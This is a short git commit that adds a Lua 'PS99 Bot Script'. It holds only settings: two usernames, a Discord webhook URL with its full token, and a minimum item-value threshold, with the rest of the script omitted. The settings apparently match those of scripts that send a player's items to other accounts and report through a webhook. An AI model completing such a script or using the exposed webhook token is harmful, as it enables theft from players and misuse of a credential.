c110161c4378cdaaa186e1e395690c1122db4df7
VOIDZ <goldbed145@gmail.com>
2024-12-13 13:19:19 +0800

    Upload new file: Ps99_Script_375112_script.lua

---
+++ Ps99_Script_375112_script.lua
@@ -0,0 +1,7 @@
+
+-- PS99 Bot Script
+Username = "mainarxd123"
+Username2 = "ggno"
+webhook = "https://discord.com/api/webhooks/1315408872793702520/pqWZQxlJS9muEbCfMkAWcOOEInL8EZkAHOgGlMxMEkgj8QkMQlqieEi22FLNgVYnCflq"
+min_rap = 20
+-- Rest of the Lua script
